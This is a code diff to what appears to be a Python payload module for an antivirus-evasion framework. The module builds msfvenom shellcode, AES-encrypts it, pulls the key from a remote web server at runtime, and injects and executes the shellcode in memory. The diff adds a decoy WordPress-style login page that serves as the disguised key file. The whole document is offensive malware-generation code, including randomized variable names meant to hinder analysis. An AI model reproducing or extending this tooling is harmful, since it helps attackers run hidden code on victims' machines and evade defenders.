@@ -1,3 +1,4 @@
+# encoding=utf8
 """
 
 This payload has AES encrypted shellcode stored on a webserver.  At runtime, the executable
@@ -22,6 +23,7 @@ required 16 Byte key. Than injects it into memory, and executes it.
 - Proper web log monitoring will identify when webserver is burnt and crucial to 
   remove key to prevent future ability to RE binary. Defenders would need to capture 
   live memory to capture key.
+- Devloped custom HTML login page to be hosted as key for payload
 
 
 
@@ -62,7 +64,8 @@ class Payload:
                                  "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                  "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                  "sleep_time" : ["60", "Set the sleep time between HTTP Key request"],
-                                 "target_server" : ["http://www.guimp.com/", "Set target HTML server to query for decryption key"]}
+                                 "target_server" : ["http://www.guimp.com/", "Set target HTML server to query for decryption key"],
+                                 "html_file_name" : ["/root/Desktop/wordpress.html", "Set the output of HTML file name"]}
 
         
         
@@ -72,7 +75,6 @@ class Payload:
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
 
-        
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -91,8 +93,59 @@ class Payload:
                 RandKeyServer = helpers.randomString()
                 RandSleep = helpers.randomString()
 
+                # Define Random Variable Names for HTML Functions
+                RandHttpstring = helpers.randomString()
+
+                # Genrate Random HTML code for webserver to host key file
+               
+                f = open(str(self.required_options["html_file_name"][0]),'w')
+                html_data = """ 
+                <!DOCTYPE html>
+                <!--[if IE 8]>
+                        <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
+                    <![endif]-->
+                <!--[if !(IE 8) ]><!-->
+                <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
+            
+    
+                <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
+                    <p>
+                        <label for="user_login">Username<br>
+                        <input name="log" id="user_login" class="input" size="20" type="text"></label>
+                    </p>
+                    <p>
+                        <label for="user_pass">Password<br>
+                    <input name="pwd" id="user_pass" class="input" value="" size="20" type="password"></label>
+                    </p>
+                        <p class="forgetmenot"><label for="rememberme"><input name="rememberme" id="rememberme" value="forever" type="checkbox"> Remember Me</label></p>
+                    <p class="submit">
+                        <input name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" type="submit">
+                        <input name="redirect_to" value="http://www.google.com" type="hidden">
+                        <input name="testcookie" value="1" type="hidden">
+                    </p>
+                    </form>
+
+                <p id="nav">
+                <a rel="nofollow" href="http://www.google.com">Register</a> |   <a href="http://www.google.com" title="Password Lost and Found">Lost your password?</a>
+                </p>
+
+
+                    <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
+    
+                    </div>
+                   
+                        <div class="clear"></div>
+    
+    
+                    </body></html>
+                """
+                html_data += '<!--'+ RandHttpstring +'-->'
+                html_data = str(html_data)
+                f.write(html_data)
+                f.close()
+
                 # encrypt the shellcode and grab the HTTP-Md5-Hex Key from new function
-                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, self.required_options["target_server"][0])
+                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
         
                 # Create Payload code
                 PayloadCode =  'import ctypes\n'
@@ -143,7 +196,7 @@ class Payload:
 
                 return PayloadCode
 
-        if self.required_options["inject_method"][0].lower() == "heap":
+        elif self.required_options["inject_method"][0].lower() == "heap":
             
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
@@ -168,6 +221,57 @@ class Payload:
                 RandMD5 = helpers.randomString()
                 RandKeyServer = helpers.randomString()
                 RandSleep = helpers.randomString()
+
+                # Define Random Variable Names for HTML Functions
+                RandHttpstring = helpers.randomString()
+
+                # Genrate Random HTML code for webserver to host key file
+               
+                f = open(str(self.required_options["html_file_name"][0]),'w')
+                html_data = """ 
+                <!DOCTYPE html>
+                <!--[if IE 8]>
+                        <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
+                    <![endif]-->
+                <!--[if !(IE 8) ]><!-->
+                <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
+            
+    
+                <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
+                    <p>
+                        <label for="user_login">Username<br>
+                        <input name="log" id="user_login" class="input" size="20" type="text"></label>
+                    </p>
+                    <p>
+                        <label for="user_pass">Password<br>
+                    <input name="pwd" id="user_pass" class="input" value="" size="20" type="password"></label>
+                    </p>
+                        <p class="forgetmenot"><label for="rememberme"><input name="rememberme" id="rememberme" value="forever" type="checkbox"> Remember Me</label></p>
+                    <p class="submit">
+                        <input name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" type="submit">
+                        <input name="redirect_to" value="http://www.google.com" type="hidden">
+                        <input name="testcookie" value="1" type="hidden">
+                    </p>
+                    </form>
+
+                <p id="nav">
+                <a rel="nofollow" href="http://www.google.com">Register</a> |   <a href="http://www.google.com" title="Password Lost and Found">Lost your password?</a>
+                </p>
+
+
+                    <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
+    
+                    </div>
+                   
+                        <div class="clear"></div>
+    
+    
+                    </body></html>
+                """
+                html_data += '<!--'+ RandHttpstring +'-->'
+                html_data = str(html_data)
+                f.write(html_data)
+                f.close()
 
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, self.required_options["target_server"][0])
@@ -248,6 +352,57 @@ class Payload:
                 RandMD5 = helpers.randomString()
                 RandKeyServer = helpers.randomString()
                 RandSleep = helpers.randomString()
+
+                # Define Random Variable Names for HTML Functions
+                RandHttpstring = helpers.randomString()
+
+                # Genrate Random HTML code for webserver to host key file
+               
+                f = open(str(self.required_options["html_file_name"][0]),'w')
+                html_data = """ 
+                <!DOCTYPE html>
+                <!--[if IE 8]>
+                        <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
+                    <![endif]-->
+                <!--[if !(IE 8) ]><!-->
+                <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
+            
+    
+                <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
+                    <p>
+                        <label for="user_login">Username<br>
+                        <input name="log" id="user_login" class="input" size="20" type="text"></label>
+                    </p>
+                    <p>
+                        <label for="user_pass">Password<br>
+                    <input name="pwd" id="user_pass" class="input" value="" size="20" type="password"></label>
+                    </p>
+                        <p class="forgetmenot"><label for="rememberme"><input name="rememberme" id="rememberme" value="forever" type="checkbox"> Remember Me</label></p>
+                    <p class="submit">
+                        <input name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" type="submit">
+                        <input name="redirect_to" value="http://www.google.com" type="hidden">
+                        <input name="testcookie" value="1" type="hidden">
+                    </p>
+                    </form>
+
+                <p id="nav">
+                <a rel="nofollow" href="http://www.google.com">Register</a> |   <a href="http://www.google.com" title="Password Lost and Found">Lost your password?</a>
+                </p>
+
+
+                    <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
+    
+                    </div>
+                   
+                        <div class="clear"></div>
+    
+    
+                    </body></html>
+                """
+                html_data += '<!--'+ RandHttpstring +'-->'
+                html_data = str(html_data)
+                f.write(html_data)
+                f.close()
 
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, self.required_options["target_server"][0])
